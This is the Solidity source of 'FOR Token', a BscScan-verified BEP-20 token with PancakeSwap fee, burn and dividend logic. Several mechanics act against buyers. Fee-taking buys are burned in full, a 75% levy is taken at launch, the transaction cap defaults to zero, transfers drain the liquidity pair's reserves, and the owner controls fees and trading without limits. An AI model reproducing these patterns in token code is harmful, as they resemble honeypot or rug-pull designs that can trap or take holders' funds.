/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

// File: ForceToken.sol



pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakePair {
    function sync() external;
}

interface IForceController {
    function addNodeDividend(uint256 dividend) external returns (uint256);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Test(uint256 a);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public dividendAddress;
    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;


    mapping(address => bool) public _feeList;

    mapping(address => address) public recommenders;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    IPancakePair  public _pancakePair;
    IForceController public _forceController;
    mapping(address => bool) public _swapPairList;


    uint256 private constant MAX = ~uint256(0);

    
    uint256 public _sellFundFee = 150;
    uint256 public _sellNodeFee = 75;
    uint256 public _sellBurnFee = 125;
    uint256 public _sellDividendFee = 250;

    uint256 public _swapFundFee = 100;
    uint256 public _swapNodeFee = 300;
    uint256 public _swapBurnFee = 200;
    uint256 public _swapDividendFee = 400;

    uint256 public totalSwap;
    uint256 public dividendSwap;
    uint256 public minDividend = 10 * 10**18;

    uint256 public totalBurn;

    uint256 private numTokensCanSwap = 200 * 10**18;
    uint256 private numTokensToSwap = 100 * 10**18;

    uint256 private maxTxAmount;

    uint256 public startTradeBlock;

    address public USDT;

    address public _mainPair;

    address public _usdtPair;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;

    bool private inSwap;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        USDT = address(0x55d398326f99059fF775485246999027B3197955);
        _usdtPair = address(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);
        
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _approve(address(this), address(swapRouter), MAX);

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDT);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        _pancakePair = IPancakePair(swapPair);

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        
        _balances[ReceiveAddress] = total * (600) / (1000);//mining
        _balances[address(0xc64C22452D9C111EA7B98aeC59847278c425A957)] = total * (2) / (1000);//LP
        _balances[address(0x889F05d4583bbeD97311E394F627f03326832F0C)] = total * (2) / (1000);//LP
        _balances[address(0xB91458A3bE48054475835A501A43c13b06CD9058)] = total * (2) / (1000);//LP
        _balances[address(0x3fb54e781871C2ce05b9348c6e0BE5b7c2E852C7)] = total * (2) / (1000);//LP
        _balances[address(0x3fc07B909B14ED5Ff24bB0Ad69438d67f1ef40ae)] = total * (2) / (1000);//LP
        _balances[address(0xf940CEf2969bB970519137c02cCeDe9cc9e5f51F)] = total * (50) / (1000);//market value
        _balances[address(0x5557083Bb5651F11cCb6d06816395Dba14eEC6A6)] = total * (50) / (1000);//foundation
        _balances[address(0x1f856398b29Ef714eEc91cBb523506F4B7AE4A9A)] = total * (290) / (1000);//node token
        
        emit Transfer(address(0), address(ReceiveAddress), total * (600) / (1000));
        emit Transfer(address(0), address(0xc64C22452D9C111EA7B98aeC59847278c425A957), total * (2) / (1000));
        emit Transfer(address(0), address(0x889F05d4583bbeD97311E394F627f03326832F0C), total * (2) / (1000));
        emit Transfer(address(0), address(0xB91458A3bE48054475835A501A43c13b06CD9058), total * (2) / (1000));
        emit Transfer(address(0), address(0x3fb54e781871C2ce05b9348c6e0BE5b7c2E852C7), total * (2) / (1000));
        emit Transfer(address(0), address(0x3fc07B909B14ED5Ff24bB0Ad69438d67f1ef40ae), total * (2) / (1000));
        emit Transfer(address(0), address(0xf940CEf2969bB970519137c02cCeDe9cc9e5f51F), total * (50) / (1000));
        emit Transfer(address(0), address(0x5557083Bb5651F11cCb6d06816395Dba14eEC6A6), total * (50) / (1000));
        emit Transfer(address(0), address(0x1f856398b29Ef714eEc91cBb523506F4B7AE4A9A), total * (290) / (1000));

        fundAddress = FundAddress;

        _feeList[FundAddress] = true;
        _feeList[ReceiveAddress] = true;
        _feeList[address(this)] = true;
        _feeList[address(swapRouter)] = true;
        _feeList[0xc64C22452D9C111EA7B98aeC59847278c425A957] = true;
        _feeList[0x889F05d4583bbeD97311E394F627f03326832F0C] = true;
        _feeList[0xB91458A3bE48054475835A501A43c13b06CD9058] = true;
        _feeList[0x3fb54e781871C2ce05b9348c6e0BE5b7c2E852C7] = true;
        _feeList[0x3fc07B909B14ED5Ff24bB0Ad69438d67f1ef40ae] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeList[from] && !_feeList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            if (amount > maxTxAmount) {
                amount = maxTxAmount;
            }
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeList[from] && !_feeList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (block.number < startTradeBlock + 2) {
                    _funTransfer(from, to, amount);
                    return;
                }
        
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance >= numTokensCanSwap) {
                            swapTokenForFund(numTokensToSwap);
                        }
                    }
                }

                takeFee = true; 
            }

            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;
        uint256 swapFeeAmount;

        if (takeFee) {
            if (isSell) {
                totalSwap += tAmount;

                uint256 fundFee = tAmount * _sellFundFee / 10000;
                uint256 nodeFee = tAmount * _sellNodeFee / 10000;
                uint256 burnFee = tAmount * _sellBurnFee / 10000;
                uint256 dividendFee = tAmount * _sellDividendFee / 10000;

                if (fundFee > 0) {
                    feeAmount += fundFee;
                    _takeTransfer(sender, address(this), fundFee);
                }
                if (nodeFee > 0) {
                    feeAmount += nodeFee;
                    _takeTransfer(sender, address(dividendAddress), nodeFee);
                }
                if (burnFee > 0) {
                    feeAmount += burnFee;
                    _takeTransfer(sender, address(deadWallet), burnFee);
                }
                if (dividendFee > 0) {
                    feeAmount += dividendFee;
                    _takeTransfer(sender, address(dividendAddress), dividendFee);
                }
            }else{
                feeAmount = tAmount;
                _takeTransfer(sender, address(deadWallet), feeAmount);
            }
        }else if (!_swapPairList[sender] && !_swapPairList[recipient]) {

            if(totalSwap > dividendSwap + minDividend){
                uint256 sAmount = totalSwap - dividendSwap;

                uint256 fundFee = sAmount * _swapFundFee / 10000;
                uint256 nodeFee = sAmount * _swapNodeFee / 10000;
                uint256 burnFee = sAmount * _swapBurnFee / 10000;
                uint256 dividendFee = sAmount * _swapDividendFee / 10000;

                if (fundFee > 0) {
                    swapFeeAmount += fundFee;
                    _takeTransfer(_mainPair, address(this), fundFee);
                }
                if (nodeFee > 0) {
                    swapFeeAmount += nodeFee;
                    _takeTransfer(_mainPair, address(dividendAddress), nodeFee);
                }
                if (burnFee > 0) {
                    swapFeeAmount += burnFee;
                    _takeTransfer(_mainPair, address(deadWallet), burnFee);
                }
                if (dividendFee > 0) {
                    swapFeeAmount += dividendFee;
                    _takeTransfer(_mainPair, address(dividendAddress), dividendFee);
                }

                _forceController.addNodeDividend(nodeFee + dividendFee);

                dividendSwap += sAmount;
                _balances[_mainPair] = _balances[_mainPair] - swapFeeAmount;
                _pancakePair.sync();
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;

        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(fundAddress),
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        if(to == address(0) || to == deadWallet){
            totalBurn += tAmount;
        }
        emit Transfer(sender, to, tAmount);
    }

    function setDividendAddress(address addr) external onlyOwner {
        dividendAddress = addr;
        _feeList[addr] = true;
        _forceController = IForceController(addr);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeList[addr] = true;
    }

    function setSwapFundFee(uint256 swapFundFee) external onlyOwner {
        _swapFundFee = swapFundFee;
    }

    function setSwapNodeFee(uint256 swapNodeFee) external onlyOwner {
        _swapNodeFee = swapNodeFee;
    }

    function setSwapBurnFee(uint256 swapBurnFee) external onlyOwner {
        _swapBurnFee = swapBurnFee;
    }

    function setSwapDividendFee(uint256 swapDividendFee) external onlyOwner {
        _swapDividendFee = swapDividendFee;
    }

    function setDividendSwap(uint256 dividend) external onlyOwner {
        dividendSwap = dividend;
    }

    function setMinDividend(uint256 dividend) external onlyOwner {
        minDividend = dividend;
    }

    function setMaxTxAmount(uint256 amount) external onlyOwner {
        maxTxAmount = amount;
    }

    uint256 public startAddLPBlock;

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "startedAddLP");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setNumTokensCanSwap(uint256 amount) external onlyOwner {
        numTokensCanSwap = amount;
    }

    function setNumTokensToSwap(uint256 amount) external onlyOwner {
        numTokensToSwap = amount;
    }

    function setMainPair(address pair) external onlyOwner {
        _mainPair = pair;
        _swapPairList[pair] = true;
        _pancakePair = IPancakePair(pair);
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    function tokenData() public view returns (uint256 supply, uint256 circulation, uint256 burn, uint256 marketValue) {
        supply = _tTotal / (10 ** 14);
        circulation = (_tTotal - totalBurn) / (10 ** 14);
        burn = totalBurn / (10 ** 14);
        marketValue = tokenEqualsToUsdt(circulation);
    }

    function tokenEqualsToUsdt(uint256 tokenAmount) public view returns(uint256 usdtAmount) {
        
        uint256 tokenOfPair = balanceOf(_mainPair);

        uint256 bnbOfPair = IERC20(USDT).balanceOf(_mainPair);

        if(tokenOfPair > 0 && bnbOfPair > 0){
            usdtAmount = tokenAmount * bnbOfPair / tokenOfPair;
        }

        return usdtAmount;
    }

    receive() external payable {}
}

contract ForceToken is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//RouterAddress
        "FOR Token",//Name
        "FOR",//Symbol
        18,//Decimals
        5000000,//Supply
        address(0xA735dfB38B25aa7E56f173494Fab9B07A49b71f2),//FundAddress
        address(0x81E4EeAE86da39803529A5bC306AA3cfAe989286)//ReceiveAddress
    ){

    }
}